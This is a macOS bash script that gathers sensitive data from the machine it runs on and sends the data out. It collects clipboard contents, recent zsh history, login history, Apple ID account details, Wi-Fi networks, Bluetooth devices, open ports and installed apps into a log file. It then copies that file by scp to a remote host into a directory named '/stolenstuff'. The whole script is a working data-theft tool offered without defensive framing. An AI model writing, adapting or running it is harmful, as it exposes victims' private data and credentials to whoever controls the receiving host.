#!/bin/bash

# Prompt the user for device IP address
read -p "Enter the IP address of your device: " device_ip

# Prompt the user for device hostname
read -p "Enter the hostname of your device: " device_hostname

# Read useful data
date=$(date "+%Y-%m-%d-%H-%M")
user=$(whoami)
host=$(hostname)
wifi_interface=$(networksetup -listallhardwareports | grep Wi-Fi -A 1 | tail -1 | sed 's/.* //')
current_wifi=$(airport --getinfo)
preferred_wifi=$(networksetup -listpreferredwirelessnetworks ${wifi_interface})
bt_devices=$(system_profiler SPBluetoothDataType)
clipboard=$(osascript -e 'the clipboard')
public_ip=$(curl ipinfo.io/ip)
ports=$(lsof -Pn -i4 | grep LISTEN)
apps=$(ls /Applications)
login_apps=$(osascript -e 'tell application "System Events" to get the name of every login item')
term_history=$(cat -n ~/.zsh_history | tail -15)
login=$(last | head -60)
appleid=$(defaults read MobileMeAccounts Accounts)
ware_info=$(system_profiler SPSoftwareDataType SPHardwareDataType)
ifaceconf=$(ifconfig)

# Write useful data to a file
cat << EOF > "${date}.log"
--- CURRENT USER ---
${user}

--- HOST ---
${host}

--- WIFI INTERFACE ---
${wifi_interface}

--- CURRENT WIFI ---
${current_wifi}

--- PREFERRED WIFI NETWORKS ---
${preferred_wifi}

--- KNOWN BLUETOOTH DEVICES ---
${bt_devices}

--- CLIPBOARD ---
${clipboard}

--- PUBLIC IP ---
${public_ip}

--- OPEN NETWORK PORTS ---
${ports}

--- APPLICATIONS ---
${apps}

--- APPLICATIONS STARTING AT SYSTEM START ---
${login_apps}

--- SOFT-, HARDWARE INFO ---
${ware_info}

--- TERMINAL HISTORY ---
${term_history}

--- LOGIN HISTORY ---
${login}

--- APPLE ID INFO ---
${appleid}

--- IFCONFIG ---
${ifaceconf}
EOF

# Display file creation message
echo "File created: ${date}.log"

# Variables
file_name="${date}.log"
device_username="your_username"   
destination_directory="/stolenstuff"  

# Check if the file exists
if [ -f "$file_name" ]; then
    # Using scp to copy the file to the device
    echo "Sending file..."
    scp "$file_name" "$device_username@$device_ip:$destination_directory"
    if [ $? -eq 0 ]; then
        echo "File sent successfully to $device_hostname ($device_ip)"
    else
        echo "Failed to send file to $device_hostname ($device_ip)"
        exit 1
    fi
else
    echo "File $file_name does not exist."
    exit 1
fi
